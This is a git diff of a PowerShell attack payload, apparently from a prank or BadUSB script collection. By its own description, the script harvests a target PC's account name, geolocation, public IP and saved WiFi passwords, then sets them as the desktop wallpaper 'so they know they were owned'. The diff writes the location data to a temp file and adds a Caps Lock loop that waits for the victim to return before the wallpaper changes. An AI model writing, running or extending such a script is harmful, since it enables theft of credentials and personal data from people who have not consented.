@@ -10,7 +10,7 @@
 #                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
 #                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
 #__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#                                                                                                            #         /       \   /     ~ \               #
+#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
 #  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
 #  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
 #  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
@@ -21,10 +21,10 @@
 
 .DESCRIPTION 
 	This program gathers details from target PC to include name associated with the microsoft account, their latitude and longitude, 
-	Public IP, and  and the SSID and WiFi password of any current or previously connected to networks.
-	It will take the gathered information and generate a .jpg with that information on show 
-	Finally that .jpg will be applied as their Desktop Wallpaper so they know they were owned
-	Additionally a secret message will be left in the binary of the wallpaper image generated and left on their desktop
+	Public IP, the SSID, and WiFi password of any current or previously connected to networks.
+	It will take the gathered information and generate a .jpg with that information on show.
+	Finally that .jpg will be applied as their Desktop Wallpaper so they know they were owned.
+	Additionally, a secret message will be left in the binary of the wallpaper image generated and left on their desktop.
 #>
 #############################################################################################################################################
 
@@ -91,8 +91,8 @@ function Get-GeoLocation{
 	if ($GeoWatcher.Permission -eq 'Denied'){
 		Write-Error 'Access Denied for Location Information'
 	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
-		
+		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
+		if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
 	}
 	}
     # Write Error is just for troubleshooting
@@ -103,8 +103,8 @@ function Get-GeoLocation{
 
 }
 
-$GL = Get-GeoLocation
-if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
+Get-GeoLocation
+#if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
 
 
 #############################################################################################################################################
@@ -405,7 +405,27 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
 #----------------------------------------------------------------------------------------------------
- 
+
+function Target-Comes {
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+#----------------------------------------------------------------------------------------------------
+
+Target-Comes
+
 Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
 
 clean-exfil
